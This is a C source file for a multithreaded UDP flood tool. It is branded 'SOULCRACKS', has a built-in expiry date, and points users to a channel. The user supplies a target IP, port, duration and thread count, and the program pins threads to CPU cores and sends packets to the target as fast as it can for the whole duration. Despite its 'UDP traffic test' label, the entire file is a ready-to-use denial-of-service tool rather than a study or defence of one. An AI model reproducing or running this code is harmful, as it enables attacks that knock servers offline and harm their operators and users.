#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <zlib.h>
#define BUFFER_SIZE 9000
#define EXPIRATION_YEAR 2024
#define EXPIRATION_MONTH 10
#define EXPIRATION_DAY 1
char *ip;
int port;
int duration;
char padding_data[2 * 1024 * 1024];
unsigned long calculate_crc32(const char *data) {
    return crc32(0, (const unsigned char *)data, strlen(data));
}
void check_expiration() {
    time_t now;
    struct tm expiration_date = {0};   
    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
    expiration_date.tm_mday = EXPIRATION_DAY;  
    time(&now);   
    if (difftime(now, mktime(&expiration_date)) > 0) {
        printf("This file is closed by SOULCRACKS.\nJOIN CHANNEL TO USE THIS FILE.\n");
        exit(EXIT_FAILURE);
    }
}
void *send_udp_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    int sent_bytes;
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(sched_getcpu(), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sock);
        pthread_exit(NULL);
    }
    snprintf(buffer, sizeof(buffer), "UDP traffic test");
    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;
    while (time(NULL) < end_time) {
        sent_bytes = sendto(sock, buffer, strlen(buffer), 0,
                            (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }
    close(sock);
    pthread_exit(NULL);
}
int main(int argc, char *argv[]) {
    check_expiration();
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    memset(padding_data, 0, sizeof(padding_data));
    unsigned long crc = calculate_crc32("SOULCRACKS");
    printf("SOULCRACKS CRC32: %lx\n", crc);
    pthread_t tid[threads];
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
            perror("Thread creation failed");
            exit(EXIT_FAILURE);
        }
    }
    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }
    return 0;
}